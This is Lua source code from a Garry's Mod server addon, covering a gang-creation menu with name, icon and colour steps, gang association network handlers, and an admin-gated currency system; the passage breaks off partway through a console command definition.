    self.leftBorderW = BRICKS_SERVER.Func.ScreenScale( 6 )
    self.currentStep = 1
end

function PANEL:CreateStepPanel( parent, h, text, subText )
    self.stepPanels = self.stepPanels or {}
    local stepNumber = #self.stepPanels+1

    local rounding = BRICKS_SERVER.Func.ScreenScale( 10 )
    local margin10 = BRICKS_SERVER.Func.ScreenScale( 10 )
    local margin25 = BRICKS_SERVER.Func.ScreenScale( 25 )

    local errorIconMat = Material( "bricks_server/step_error.png", "noclamp smooth" )
    local completedIconMat = Material( "bricks_server/step_completed.png", "noclamp smooth" )
    local iconSize = BRICKS_SERVER.Func.ScreenScale( 24 )

    surface.SetFont( "BRICKS_SERVER_Font22B" )
    local textW, textH = surface.GetTextSize( string.upper( text ) )

    surface.SetFont( "BRICKS_SERVER_Font20B" )
    local subTextW, subTextH = surface.GetTextSize( subText )

    local stepPanel = vgui.Create( "DPanel", parent )
    stepPanel:Dock( TOP )
    stepPanel:SetTall( h )
    stepPanel:DockMargin( 0, margin25, 0, 0 )
    stepPanel.leftW = BRICKS_SERVER.Func.ScreenScale( 50 )
    stepPanel.Paint = function( self2, w, h )
        local isAvailable = true--self.currentStep >= stepNumber or self.stepPanels[stepNumber-1].completed

        if( not isAvailable ) then
            surface.SetAlphaMultiplier( 0.5 )
        end

        draw.RoundedBox( rounding, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 1 ) )
        draw.RoundedBox( rounding, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 2, 200 ) )

        surface.SetDrawColor( BRICKS_SERVER.Func.GetTheme( 3, 100 ) )
        surface.DrawRect( self.leftBorderW, 0, self2.leftW, h )

        surface.SetDrawColor( BRICKS_SERVER.Func.GetTheme( 6, 10 ) )
        surface.SetMaterial( self2.completed and completedIconMat or errorIconMat )
        surface.DrawTexturedRect( self.leftBorderW+self2.leftW*0.5-iconSize*0.5, h*0.5-iconSize*0.5, iconSize, iconSize )

        local highlightColor = BRICKS_SERVER.Func.GetTheme( 3 )
        if( isAvailable ) then
            highlightColor = self2.completed and BRICKS_SERVER.DEVCONFIG.BaseThemes.Green or BRICKS_SERVER.DEVCONFIG.BaseThemes.Red
        end

        BRICKS_SERVER.Func.DrawPartialRoundedBox( rounding, 0, 0, 6, h, highlightColor, 2*self.leftBorderW, h )
    
        local leftMargin = self.leftBorderW+self2.leftW+margin25
        draw.SimpleText( string.upper( text ), "BRICKS_SERVER_Font22B", leftMargin, margin25, BRICKS_SERVER.Func.GetTheme( 5 ) )
        draw.SimpleText( subText, "BRICKS_SERVER_Font20B", leftMargin, margin25+textH, BRICKS_SERVER.Func.GetTheme( 6, 50 ) )
        surface.SetAlphaMultiplier( 1 )
    end
    stepPanel.requirementEntries = {}
    stepPanel.AddRequirement = function( self2, requirementText, hasPassed, infoFunc )
        surface.SetFont( "BRS.Font.Bold20" )
        requirementText = string.upper( requirementText )

        local tickIconMat = Material( "bricks_server/accept_16.png" )
        local crossIconMat = Material( "bricks_server/decline_16.png" )
        local iconSize = BRICKS_SERVER.Func.ScreenScale( 16 )
    
        local requirementEntry = vgui.Create( "DPanel", self2.requirementsPanel )
        requirementEntry:Dock( LEFT )
        requirementEntry:SetWide( self2.requirementsPanel:GetTall()+surface.GetTextSize( requirementText )+margin10+(infoFunc and self2.requirementsPanel:GetTall() or 0) )
        requirementEntry:DockMargin( 0, 0, margin10, 0 )
        requirementEntry.hasPassed = hasPassed()
        requirementEntry.Paint = function( self2, w, h )
            local highlightColor = self2.hasPassed and BRICKS_SERVER.DEVCONFIG.BaseThemes.DarkGreen or BRICKS_SERVER.DEVCONFIG.BaseThemes.DarkRed

            draw.RoundedBox( 5, 0, 0, w, h, Color( highlightColor.r, highlightColor.g, highlightColor.b, 25 ) )

            surface.SetDrawColor( highlightColor )
            surface.SetMaterial( self2.hasPassed and tickIconMat or crossIconMat )
            surface.DrawTexturedRect( h*0.5-iconSize*0.5, h*0.5-iconSize*0.5, iconSize, iconSize )

            draw.SimpleText( requirementText, "BRS.Font.Bold20", w-margin10-(infoFunc and h or 0), h*0.5-1, highlightColor, TEXT_ALIGN_RIGHT, TEXT_ALIGN_CENTER )
        end

        if( infoFunc ) then
            local infoButton = vgui.Create( "DButton", requirementEntry )
            infoButton:Dock( RIGHT )
            infoButton:SetWide( self2.requirementsPanel:GetTall() )
            infoButton:SetText( "" )
            infoButton.Paint = function( self2, w, h )
                draw.RoundedBoxEx( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 6, 5+(self2:IsHovered() and 5 or 0) ), false, true, false, true )
        
                draw.SimpleText( "!", "BRICKS_SERVER_Font30B", w*0.5, h*0.5, BRICKS_SERVER.Func.GetTheme( 6, 50 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
            end
            infoButton.DoClick = infoFunc
        end

        local reqWide = self2.requirementsPanel:GetWide()
        self2.requirementsPanel:SetWide( reqWide+(reqWide != 0 and margin10 or 0)+requirementEntry:GetWide() )

        table.insert( self2.requirementEntries, { requirementEntry, hasPassed } )
    end
    stepPanel.UpdateCompletion = function( self2 )
        local requirementsCompleted = true
        for k, v in ipairs( self2.requirementEntries ) do
            local passed = v[2]()
            v[1].hasPassed = passed

            if( passed ) then continue end
            requirementsCompleted = false
        end

        self2.completed = self2.isCompletedFunc( requirementsCompleted )

        if( not self2.completed or self.currentStep > stepNumber ) then return end
        self.currentStep = stepNumber+1
    end

    stepPanel.requirementsPanel = vgui.Create( "Panel", stepPanel )
    stepPanel.requirementsPanel:SetTall( BRICKS_SERVER.Func.ScreenScale( 30 ) )
    stepPanel.requirementsPanel:SetPos( self.leftBorderW+stepPanel.leftW+margin25+subTextW+margin25, margin25+(textH+subTextH)*0.5-stepPanel.requirementsPanel:GetTall()*0.5 )

    table.insert( self.stepPanels, stepPanel )
    return stepPanel
end

function PANEL:FillPanel()
    local rounding = BRICKS_SERVER.Func.ScreenScale( 10 )
    local margin5 = BRICKS_SERVER.Func.ScreenScale( 5 )
    local margin10 = BRICKS_SERVER.Func.ScreenScale( 10 )
    local margin25 = BRICKS_SERVER.Func.ScreenScale( 25 )
    local margin50 = BRICKS_SERVER.Func.ScreenScale( 50 )

    local contentPanel = vgui.Create( "Panel", self )
    contentPanel.OnSizeChanged = function( self2, w, h )
        self2:SetPos( margin50, self.panelHeight*0.5-h*0.5 )
    end
    contentPanel:SetSize( self.panelWide-2*margin50, 0 )

    local newPageIconMat = Material( "bricks_server/gang_page_new.png", "noclamp smooth" )
    local newPageIconSize = BRICKS_SERVER.Func.ScreenScale( 75 )
    local newIconMat = Material( "bricks_server/gang_new_banner.png", "noclamp smooth" )
    local newIconSize = BRICKS_SERVER.Func.ScreenScale( 75 )

    surface.SetFont( "BRICKS_SERVER_Font40B" )
    local contentH = select( 2, surface.GetTextSize( "CREATE A NEW GANG" ) )

    surface.SetFont( "BRICKS_SERVER_Font20B" )
    contentH = contentH+select( 2, surface.GetTextSize( "INVITE YOUR FRIENDS AND EARN MONEY!" ) )-BRICKS_SERVER.Func.ScreenScale( 20 )

    local headerPanel = vgui.Create( "DPanel", contentPanel )
    headerPanel:Dock( TOP )
    headerPanel:SetTall( BRICKS_SERVER.Func.ScreenScale( 150 ) )
    headerPanel.leftW = BRICKS_SERVER.Func.ScreenScale( 175 )
    headerPanel.Paint = function( self2, w, h )
        draw.RoundedBox( rounding, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 1 ) )
        draw.RoundedBox( rounding, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 2, 200 ) )

        surface.SetDrawColor( BRICKS_SERVER.Func.GetTheme( 3, 100 ) )
        surface.DrawRect( self.leftBorderW, 0, self2.leftW, h )

        surface.SetDrawColor( BRICKS_SERVER.Func.GetTheme( 6, 50 ) )
        surface.SetMaterial( newPageIconMat )
        surface.DrawTexturedRect( self.leftBorderW+self2.leftW*0.5-newPageIconSize*0.5, h*0.5-newPageIconSize*0.5, newPageIconSize, newPageIconSize )
        
        surface.SetDrawColor( BRICKS_SERVER.Func.GetTheme( 6, 25 ) )
        surface.SetMaterial( newIconMat )
        surface.DrawTexturedRect( self.leftBorderW+self2.leftW-newIconSize, 0, newIconSize, newIconSize )

        local leftMargin = self.leftBorderW+self2.leftW+(h-contentH)*0.5
        draw.SimpleText( "CREATE A NEW GANG", "BRICKS_SERVER_Font40B", leftMargin-1, h*0.5-contentH*0.5-BRICKS_SERVER.Func.ScreenScale( 10 ), BRICKS_SERVER.Func.GetTheme( 6, 50 ), 0, 0 )
        draw.SimpleText( "INVITE YOUR FRIENDS AND EARN MONEY!", "BRICKS_SERVER_Font20B", leftMargin, h*0.5+contentH*0.5+BRICKS_SERVER.Func.ScreenScale( 4 ), BRICKS_SERVER.Func.GetTheme( 6, 50 ), 0, TEXT_ALIGN_BOTTOM )
    
        if( not self2.startLoading or CurTime() >= self2.startLoading+1 or CurTime()-firstPanel.startLoading < 0.2 ) then return end

        local circleThick = BRICKS_SERVER.Func.ScreenScale( 5 )
        local circleR = BRICKS_SERVER.Func.ScreenScale( 25 )
        BRICKS_SERVER.Func.DrawArc( w-h*0.5, h*0.5, circleR, circleThick, 0, 360, BRICKS_SERVER.Func.GetTheme( 3 ) )

        local percent = CurTime()*1
        BRICKS_SERVER.Func.DrawArc( w-h*0.5, h*0.5, circleR, circleThick, -360*percent, -360*percent+50, BRICKS_SERVER.Func.GetTheme( 5 ) )
    end

    contentPanel:SetTall( headerPanel:GetTall() )

    headerPanel.gradient = vgui.Create( "bricks_server_gradientanim", headerPanel )
    headerPanel.gradient:SetPos( 0, 0 )
    headerPanel.gradient:SetSize( self.leftBorderW, headerPanel:GetTall() )
    headerPanel.gradient:SetDirection( 1 )
    headerPanel.gradient:SetCornerRadius( rounding )
    headerPanel.gradient:SetRoundedBoxDimensions( false, false, 20, false )
    headerPanel.gradient:TasteTheRainbow()
    headerPanel.gradient:StartAnim()

    local pricePanel
    local createButton = vgui.Create( "DButton", headerPanel )
    createButton:Dock( RIGHT )
    createButton:DockMargin( 0, margin50, margin25, margin50 )
    createButton:SetWide( BRICKS_SERVER.Func.ScreenScale( 200 ) )
    createButton:SetText( "" )
    createButton.Paint = function( self2, w, h )
        draw.RoundedBox( rounding, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 3, 50 ) )

        self2.hoverPercent = math.Clamp( (self2.hoverPercent or 0)+(self2:IsHovered() and 5 or -5), 0, 100 )

        local x, y = self2:LocalToScreen( 0, 0 )
        render.SetScissorRect( x+w*0.5-w*(self2.hoverPercent/200), y, x+w*0.5+w*(self2.hoverPercent/200), y+h, true )
        draw.RoundedBox( rounding, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 3, 100 ) )
        render.SetScissorRect( 0, 0, 0, 0, false )

        draw.SimpleText( "CREATE GANG", "BRICKS_SERVER_Font30B", w*0.5, h*0.5, BRICKS_SERVER.Func.GetTheme( 6, 50 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
    end

    pricePanel = vgui.Create( "DPanel", headerPanel )
    pricePanel:Dock( RIGHT )
    pricePanel:DockMargin( 0, margin50, margin25, margin50 )
    pricePanel:SetWide( BRICKS_SERVER.Func.ScreenScale( 150 ) )
    pricePanel.Paint = function( self2, w, h )
        draw.RoundedBox( rounding, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 3, 50 ) )

        draw.SimpleText( DarkRP.formatMoney( BRICKS_SERVER.CONFIG.GANGS["Creation Fee"] or 1500 ), "BRICKS_SERVER_Font30B", w*0.5, h*0.5, BRICKS_SERVER.DEVCONFIG.BaseThemes.Green, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
    end

    -- First Step
    local firstPanel = self:CreateStepPanel( contentPanel, BRICKS_SERVER.Func.ScreenScale( 150 ), "Gang Name", "A cool name for your new gang." )
    contentPanel:SetTall( contentPanel:GetTall()+margin25+firstPanel:GetTall() )

    local gangNameEntry = vgui.Create( "bricks_server_textentry", firstPanel )
    gangNameEntry:SetSize( contentPanel:GetWide()*0.3, BRICKS_SERVER.Func.ScreenScale( 40 ) )
    gangNameEntry:SetPos( self.leftBorderW+firstPanel.leftW+margin25, firstPanel:GetTall()-margin25-gangNameEntry:GetTall() )
    gangNameEntry:SetFont( "BRICKS_SERVER_Font22" )
    gangNameEntry.backColor = BRICKS_SERVER.Func.GetTheme( 0, 100 )
    local newGangName = ""
    gangNameEntry.OnChange = function()
        newGangName = string.Trim( gangNameEntry:GetValue() )
        firstPanel:UpdateCompletion()
    end

    firstPanel:AddRequirement( "+" .. BRICKS_SERVER.DEVCONFIG.GangNameCharMin .. " Length", function() 
        return string.len( newGangName ) >= BRICKS_SERVER.DEVCONFIG.GangNameCharMin
    end )

    firstPanel:AddRequirement( "< " .. BRICKS_SERVER.DEVCONFIG.GangNameCharMax .. " Length", function() 
        return string.len( newGangName ) <= BRICKS_SERVER.DEVCONFIG.GangNameCharMax
    end )

    firstPanel:AddRequirement( "Only Letters/Numbers", function() 
        return not string.match( string.Replace( newGangName, " ", "" ), "[%W]" )
    end )

    firstPanel.isCompletedFunc = function( requirementsPassed )
        return requirementsPassed
    end

    -- Second Step
    local secondPanel = self:CreateStepPanel( contentPanel, BRICKS_SERVER.Func.ScreenScale( 185 ), "Gang Icon", "An icon used when displaying your gang." )
    contentPanel:SetTall( contentPanel:GetTall()+margin25+secondPanel:GetTall() )

    secondPanel.bottom = vgui.Create( "Panel", secondPanel )
    secondPanel.bottom:Dock( BOTTOM )
    secondPanel.bottom:SetTall( BRICKS_SERVER.Func.ScreenScale( 75 ) )
    secondPanel.bottom:DockMargin( self.leftBorderW+secondPanel.leftW+margin25, 0, margin25, margin25 )

    local unselectedIconMat = Material( "bricks_server/icon_unselected.png" )
    local newGangIcon, loadingNewIcon, newGangIconMat = "", false

    local currentIconDisplay = vgui.Create( "Panel", secondPanel.bottom )
    currentIconDisplay:Dock( LEFT )
    currentIconDisplay:SetWide( BRICKS_SERVER.Func.ScreenScale( 75 ) )
    currentIconDisplay.Paint = function( self2, w, h )
        draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 0, 100 ) )

        if( loadingNewIcon ) then
            if( CurTime() >= (self2.loadingStart or 0)+1.5 ) then
                self2.loadingStart = CurTime()
            end

            local percent = math.Clamp( (CurTime()-self2.loadingStart)/1.5, 0, 1 )

            local entrySize, entryMargin = BRICKS_SERVER.Func.ScreenScale( 10 ), margin5
            local yOffset = margin5
            local totalEntryW = 3*(entrySize+entryMargin)-entryMargin
            for i = 1, 3 do
                local min = (i-1)*(1/3)
                local isActive = percent >= min and percent < i*(1/3)
                local entryPercent = math.Clamp( (percent-min)*3, 0, 1 )
                local yAdjustment = isActive and (entryPercent < 0.5 and (entryPercent/0.5)*yOffset or yOffset-((entryPercent-0.5)/0.5*yOffset)) or 0

                surface.SetDrawColor( BRICKS_SERVER.Func.GetTheme( 3 ) )
                surface.DrawRect( w*0.5-totalEntryW*0.5+(i-1)*(entryMargin+entrySize), h*0.5-entrySize*0.5-yAdjustment, entrySize, entrySize )
            end

            return
        end
        
        local unselectedIconSize = newGangIconMat and h*0.75 or BRICKS_SERVER.Func.ScreenScale( 64 )

        surface.SetDrawColor( newGangIconMat and BRICKS_SERVER.DEVCONFIG.BaseThemes.White or BRICKS_SERVER.Func.GetTheme( 2 ) )
        surface.SetMaterial( newGangIconMat or unselectedIconMat )
        surface.DrawTexturedRect( w*0.5-unselectedIconSize*0.5, h*0.5-unselectedIconSize*0.5, unselectedIconSize, unselectedIconSize )
    end

    local presetsSpacer = vgui.Create( "Panel", secondPanel.bottom )
    presetsSpacer:Dock( LEFT )
    presetsSpacer:SetWide( 4 )
    presetsSpacer:DockMargin( margin50, margin10, margin50, margin10 )
    presetsSpacer.Paint = function( self2, w, h )
        draw.RoundedBox( w*0.5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 0, 100 ) )
    end

    surface.SetFont( "BRICKS_SERVER_Font20B" )

    local presetsHeader = vgui.Create( "Panel", secondPanel.bottom )
    presetsHeader:Dock( LEFT )
    presetsHeader:SetWide( surface.GetTextSize( "Default icons" ) )
    presetsHeader.Paint = function( self2, w, h )
        draw.SimpleText( "PRESETS", "BRICKS_SERVER_Font22B", 0, h*0.5+2, BRICKS_SERVER.Func.GetTheme( 4 ), 0, TEXT_ALIGN_BOTTOM )
        draw.SimpleText( "Default icons", "BRICKS_SERVER_Font20B", 0, h*0.5-2, BRICKS_SERVER.Func.GetTheme( 6, 50 ), 0, 0 )
    end

    local presetsPanel = vgui.Create( "Panel", secondPanel.bottom )
    presetsPanel:Dock( LEFT )
    presetsPanel:SetTall( secondPanel.bottom:GetTall()-2*margin5 )
    presetsPanel:DockMargin( margin25, margin5, 0, margin5 )

    local customUrlEntry

    for k, v in ipairs( BRICKS_SERVER.DEVCONFIG.PresetGangIcons ) do
        local presetIconMat = Material( v, "noclamp smooth" )
    
        local currentIconDisplay = vgui.Create( "DButton", presetsPanel )
        currentIconDisplay:Dock( LEFT )
        currentIconDisplay:SetWide( presetsPanel:GetTall() )
        currentIconDisplay:DockMargin( 0, 0, margin5, 0 )
        currentIconDisplay:SetText( "" )
        currentIconDisplay.Paint = function( self2, w, h )
            local isSelected = v == newGangIcon
            self2.hoverAlpha = math.Clamp( (self2.hoverAlpha or 0)+(self2:IsHovered() and 5 or -5), 0, 100 )

            draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 0, 100+(isSelected and 50 or self2.hoverAlpha) ) )

            local borderH = 3
            BRICKS_SERVER.Func.DrawPartialRoundedBox( 5, 0, h-borderH, w, borderH, BRICKS_SERVER.Func.GetTheme( 5, isSelected and 255 or self2.hoverAlpha ), w, 10, 0, h-10 )

            local iconSize = h*0.75
    
            surface.SetDrawColor( 255, 255, 255 )
            surface.SetMaterial( presetIconMat )
            surface.DrawTexturedRect( w*0.5-iconSize*0.5, h*0.5-iconSize*0.5, iconSize, iconSize )
        end
        currentIconDisplay.DoClick = function()
            if( newGangIcon == v ) then
                newGangIcon = ""
                newGangIconMat = nil
            else
                newGangIcon = v
                newGangIconMat = presetIconMat
                loadingNewIcon = false
                customUrlEntry:SetValue( "" )
            end

            secondPanel:UpdateCompletion()
        end
    end

    presetsPanel:SetWide( #BRICKS_SERVER.DEVCONFIG.PresetGangIcons*(presetsPanel:GetTall()+margin5)-margin5 )

    local customSpacer = vgui.Create( "Panel", secondPanel.bottom )
    customSpacer:Dock( LEFT )
    customSpacer:SetWide( 4 )
    customSpacer:DockMargin( margin50, margin10, margin50, margin10 )
    customSpacer.Paint = function( self2, w, h )
        draw.RoundedBox( w*0.5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 0, 100 ) )
    end
    
    local customHeader = vgui.Create( "Panel", secondPanel.bottom )
    customHeader:Dock( LEFT )
    customHeader:SetWide( surface.GetTextSize( "A custom icons" ) )
    customHeader.Paint = function( self2, w, h )
        draw.SimpleText( "CUSTOM", "BRICKS_SERVER_Font22B", 0, h*0.5+2, BRICKS_SERVER.Func.GetTheme( 4 ), 0, TEXT_ALIGN_BOTTOM )
        draw.SimpleText( "A custom icon", "BRICKS_SERVER_Font20B", 0, h*0.5-2, BRICKS_SERVER.Func.GetTheme( 6, 50 ), 0, 0 )
    end

    local customEntryBar = vgui.Create( "Panel", secondPanel.bottom )
    customEntryBar:Dock( LEFT )
    customEntryBar:SetWide( ScrW()*0.1 )
    local verticalMargin = (secondPanel.bottom:GetTall()-BRICKS_SERVER.Func.ScreenScale( 40 ))*0.5
    customEntryBar:DockMargin( margin25, verticalMargin, 0, verticalMargin )
    customEntryBar.Paint = function( self2, w, h )
        if( not IsValid( customUrlEntry ) or customUrlEntry:GetValue() == "" or customUrlEntry:GetValue() == newGangIcon ) then return end

        local oldClipping = DisableClipping( true )
        draw.SimpleText( "PRESS ENTER TO SAVE", "BRICKS_SERVER_Font20B", w*0.5, h, BRICKS_SERVER.Func.GetTheme( 6, 50 ), TEXT_ALIGN_CENTER, 0 )
        DisableClipping( oldClipping )
    end

    customUrlEntry = vgui.Create( "bricks_server_textentry", customEntryBar )
    customUrlEntry:Dock( BOTTOM )
    customUrlEntry:SetTall( BRICKS_SERVER.Func.ScreenScale( 40 ) )
    customUrlEntry:DockMargin( 0, 0, 0, 0 )
    customUrlEntry:SetFont( "BRICKS_SERVER_Font22" )
    customUrlEntry.backColor = BRICKS_SERVER.Func.GetTheme( 0, 100 )
    customUrlEntry.OnEnter = function( self2 )
        local newValue = self2:GetValue()
        loadingNewIcon = true
        newGangIcon = newValue
        newGangIconMat = nil

        BRICKS_SERVER.Func.GetImage( newGangIcon, function( mat )
            if( newGangIcon != newValue ) then return end
            newGangIconMat = mat 
            loadingNewIcon = false
        end )

        secondPanel:UpdateCompletion()
    end

    local validImageEndings = { ".png", ".jpg", ".jpeg" }
    secondPanel:AddRequirement( ".png, .jpg or .jpeg", function() 
        if( table.HasValue( BRICKS_SERVER.DEVCONFIG.PresetGangIcons, newGangIcon ) ) then return true end

        for _, v in ipairs( validImageEndings ) do
            if( string.EndsWith( newGangIcon, v ) ) then return true end
        end

        return false
    end )

    -- BRICKS_SERVER.DEVCONFIG.GangURLWhitelist
    -- Show whitelsited urls when hovering?
    secondPanel:AddRequirement( "Whitelisted URL", function() 
        if( table.HasValue( BRICKS_SERVER.DEVCONFIG.PresetGangIcons, newGangIcon ) ) then return true end

        for _, v in ipairs( BRICKS_SERVER.DEVCONFIG.GangURLWhitelist ) do
            if( string.StartWith( newGangIcon, v ) ) then return true end
        end

        return false
    end, function( self2 )
        if( IsValid( self2.hoverPopup ) ) then
            self2.hoverPopup:Remove()
        end

        local x, y = self2:LocalToScreen( 0, 0 )

        self2.hoverPopup = vgui.Create( "DFrame" )
        self2.hoverPopup:SetSize( 300, 500 )
        self2.hoverPopup:Center()
        self2.hoverPopup:MakePopup()
        self2.hoverPopup:SetTitle( "" )
        self2.hoverPopup:DockPadding( 25, 50, 0, 0 )

        for k, v in ipairs( BRICKS_SERVER.DEVCONFIG.GangURLWhitelist ) do
            local urlEntry = vgui.Create( "DLabel", self2.hoverPopup )
            urlEntry:Dock( TOP )
            urlEntry:SetText( v )
            urlEntry:SetFont( "Trebuchet24" )
            urlEntry:SizeToContentsY()
        end
    end )

    secondPanel.isCompletedFunc = function( requirementsPassed )
        return requirementsPassed
    end

    -- Third Step
    local thirdPanel = self:CreateStepPanel( contentPanel, BRICKS_SERVER.Func.ScreenScale( 160 ), "Gang Colour", "The colour of your gang, displayed in various places." )
    contentPanel:SetTall( contentPanel:GetTall()+margin25+thirdPanel:GetTall() )

    thirdPanel.bottom = vgui.Create( "Panel", thirdPanel )
    thirdPanel.bottom:Dock( BOTTOM )
    thirdPanel.bottom:SetTall( BRICKS_SERVER.Func.ScreenScale( 50 ) )
    thirdPanel.bottom:DockMargin( self.leftBorderW+thirdPanel.leftW+margin25, 0, margin25, margin25 )

    local newGangColour

    local colourOptions = { 
        Color( 244, 67, 54 ),
        Color( 233, 30, 99 ),
        Color( 156, 39, 176 ),
        Color( 103, 58, 183 ),
        Color( 63, 81, 181 ),
        Color( 33, 150, 243 ),
        Color( 3, 169, 244 ),
        Color( 0, 188, 212 ),
        Color( 0, 150, 136 ),
        Color( 76, 175, 80 ),
        Color( 139, 195, 74 ),
        Color( 205, 220, 57 ),
        Color( 255, 235, 59 ),
        Color( 255, 193, 7 ),
        Color( 255, 152, 0 ),
        Color( 255, 87, 34 ),
    }

    -- colourOptions = {}
    -- for i = 0, 9 do
    --     table.insert( colourOptions, HSVToColor( (360/10)*i, 0.8, 1 ) )
    -- end

    local colourEntrySize = math.floor( (thirdPanel.bottom:GetTall()-margin5)*0.5 )

    local colourGrid = vgui.Create( "DIconLayout", thirdPanel.bottom )
    colourGrid:Dock( LEFT )
    colourGrid:SetWide( (math.ceil( #colourOptions*0.5 )*(colourEntrySize+margin5))-margin5 )
    colourGrid:SetSpaceX( margin5 )
    colourGrid:SetSpaceY( margin5 )
    
    local whiteColour = BRICKS_SERVER.DEVCONFIG.BaseThemes.White
    local circleBorder = BRICKS_SERVER.Func.ScreenScale( 2 )
    for k, v in ipairs( colourOptions ) do
        local colourEntry = vgui.Create( "DButton", colourGrid )
        colourEntry:SetSize( colourEntrySize, colourEntrySize )
        colourEntry:SetText( "" )
        colourEntry.Paint = function( self2, w, h )
            self2.hoverAlpha = math.Clamp( (self2.hoverAlpha or 0)+(self2:IsHovered() and 5 or -5), 0, 100 )

            local isSelected = v == newGangColour
            if( isSelected or self2.hoverAlpha != 0 ) then
                local oldClipping = DisableClipping( true )
                surface.SetAlphaMultiplier( isSelected and 1 or self2.hoverAlpha/255 )
                BRICKS_SERVER.Func.DrawCircle( w*0.5, h*0.5, w*0.5+circleBorder, whiteColour )
                surface.SetAlphaMultiplier( 1 )
                DisableClipping( oldClipping )
            end

            BRICKS_SERVER.Func.DrawCircle( w*0.5, h*0.5, w*0.5, v )
        end
        colourEntry.DoClick = function()
            if( newGangColour == v ) then
                newGangColour = nil
            else
                newGangColour = v
            end

            thirdPanel:UpdateCompletion()
        end
    end

    thirdPanel.isCompletedFunc = function( requirementsPassed )
        return newGangColour != nil
    end

    -- Create Button
    createButton.DoClick = function()
        for k, v in ipairs( self.stepPanels ) do
            if( not v.completed ) then return end
        end
        
        net.Start( "BRS.Net.CreateGang" )
            net.WriteString( newGangIcon )
            net.WriteString( newGangName )
        net.SendToServer()
    end
end

function PANEL:Paint( w, h )

end

vgui.Register( "bricks_server_gangmenu_create", PANEL, "DPanel" )
--PATH addons/____bricks_gangs/lua/bricks_server/modules/gangs/submodules/associations/client/cl_gang_associations.lua:
net.Receive( "BRS.Net.SendGangAssociations", function()
    if( not BRS_GANG_ASSOCIATIONS ) then
        BRS_GANG_ASSOCIATIONS = {}
    end

    for k, v in pairs( net.ReadTable() or {} ) do
        if( not BRS_GANG_ASSOCIATIONS[k] ) then
            BRS_GANG_ASSOCIATIONS[k] = v
            continue
        end

        table.Merge( BRS_GANG_ASSOCIATIONS[k], v )
    end

    hook.Run( "BRS.Hooks.RefreshGangAssociations" )
end )

net.Receive( "BRS.Net.SendGangAssociationValue", function()
    local gang1ID = net.ReadUInt( 16 )
    local gang2ID = net.ReadUInt( 16 )
    local associationType = net.ReadString()

    if( not BRS_GANG_ASSOCIATIONS ) then
        BRS_GANG_ASSOCIATIONS = {}
    end

    if( BRS_GANG_ASSOCIATIONS[gang2ID] and BRS_GANG_ASSOCIATIONS[gang2ID][gang1ID] ) then
        BRS_GANG_ASSOCIATIONS[gang2ID][gang1ID] = nil
    end

    if( not BRS_GANG_ASSOCIATIONS[gang1ID] ) then
        BRS_GANG_ASSOCIATIONS[gang1ID] = {}
    end

    if( associationType and BRICKS_SERVER.DEVCONFIG.GangAssociationTypes[associationType] ) then
        BRS_GANG_ASSOCIATIONS[gang1ID][gang2ID] = associationType
    else
        BRS_GANG_ASSOCIATIONS[gang1ID][gang2ID] = nil
    end

    hook.Run( "BRS.Hooks.RefreshGangAssociations" )
end )

net.Receive( "BRS.Net.SendAssociationGangTables", function()
    hook.Run( "BRS.Hooks.RefreshGangAssociations", net.ReadTable() or {} )
end )

function BRICKS_SERVER.Func.RequestAssociationGangs( searchString )
    if( CurTime() < (BRS_REQUEST_ASSOCIATIONGANG_COOLDOWN or 0) ) then return false, BRICKS_SERVER.Func.L( "gangRequestCooldown" ), ((BRS_REQUEST_ASSOCIATIONGANG_COOLDOWN or 0)-CurTime()) end

    BRS_REQUEST_ASSOCIATIONGANG_COOLDOWN = CurTime()+3

    net.Start( "BRS.Net.RequestAssociationGangs" )
        net.WriteString( searchString )
    net.SendToServer()

    return true
end
--PATH addons/____bricks_framework/lua/bricks_server/modules/default/submodules/currencies/shared/sh_currency_system.lua:
local playerMeta = FindMetaTable("Player")

function playerMeta:GetCurrencies()
    if( CLIENT and self == LocalPlayer() ) then
        return BRS_CURRENCIES
    else
        return self.BRS_CURRENCIES or {}
    end
end

function playerMeta:GetCurrency( currency )
	if( not BRICKS_SERVER.CONFIG.CURRENCIES[currency] ) then return 0 end

    return self:GetCurrencies()[currency] or 0
end

concommand.Add( "addcurrency", function( ply, cmd, args )
    if( CLIENT ) then
		if( not BRICKS_SERVER.Func.HasAdminAccess( ply ) ) then 
			print( "BRICKS SERVER ERROR: NO ACCESS" )
			return 
		end

		if( args[1] and args[2] and args[3] and isstring( args[1] ) and isnumber( tonumber( args[2] ) ) and isnumber( tonumber( args[3] ) ) ) then
			net.Start( "BRS.Net.Admin_AddCurrency" )
				net.WriteString( args[1] )
				net.WriteUInt( tonumber( args[2] ), 8 )
				net.WriteInt( tonumber( args[3] ), 32 )
			net.SendToServer()
		end
    elseif( SERVER ) then
        local steamid64 = args[1]
        local currencyType = tonumber( args[2] or 0 )
        local amount = tonumber( args[3] or 0 )
        if( (not IsValid( ply ) or BRICKS_SERVER.Func.HasAdminAccess( ply )) and steamid64 and currencyType and amount ) then
            if( not BRICKS_SERVER.CONFIG.CURRENCIES[currencyType] ) then return end
        
            local victim = player.GetBySteamID64( steamid64 )
        
            if( not IsValid( victim ) ) then return end
        
            victim:AddCurrency( currencyType, amount )

            if( IsValid( ply ) ) then
				BRICKS_SERVER.Func.SendNotification( ply, 1, 5, "Gave " .. victim:Nick() .. " " .. string.Comma( amount ) .. " " .. (BRICKS_SERVER.CONFIG.CURRENCIES[currencyType].Name or "ERROR") )
            end

			BRICKS_SERVER.Func.SendNotification( victim, 1, 5, "An admin has gave you " .. string.Comma( amount ) .. " " .. (BRICKS_SERVER.CONFIG.CURRENCIES[currencyType].Name or "ERROR") )
        end
	end
end )

concommand.Add( "setcurrency", function( ply, cmd, args )
    if( CLIENT ) then
